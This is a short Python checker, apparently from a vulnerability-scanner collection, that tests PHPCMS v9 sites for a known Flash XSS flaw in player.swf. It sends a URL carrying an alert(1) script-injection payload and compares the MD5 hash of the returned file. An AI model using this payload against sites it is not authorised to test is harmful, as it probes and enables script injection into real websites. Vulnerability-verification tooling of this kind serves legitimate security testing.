#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpcms v9 flash xss漏洞
referer: http://www.wooyun.org/bugs/wooyun-2014-079938
author: Lucifer
description: 文件player.swf中,存在xss漏洞。
'''
import sys
import urllib.request
import hashlib
import requests



class phpcms_v9_flash_xss_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        flash_md5 = "cf00b069e36e756705c49b3a3bf20c40"
        payload = "/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf&stream=\%22))}catch(e){alert(1)}//"
        vulnurl = self.url + payload
        try:
            req = urllib.request.urlopen(vulnurl)
            data = req.read()
            md5_value = hashlib.md5(data).hexdigest()
            if md5_value in flash_md5:
                return "[+]存在phpcms v9 flash xss漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = phpcms_v9_flash_xss_BaseVerify(sys.argv[1])
    testVuln.run()